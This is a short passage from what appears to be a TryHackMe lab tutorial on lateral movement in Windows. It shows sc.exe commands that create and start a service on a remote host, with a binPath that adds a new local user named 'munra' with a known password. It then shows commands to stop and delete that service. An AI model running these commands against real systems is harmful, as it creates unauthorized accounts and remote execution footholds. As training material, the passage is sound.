We can create and start a service named "THMservice" using the following commands:

```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

To stop and delete the service, we can then execute the following commands:

```
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```
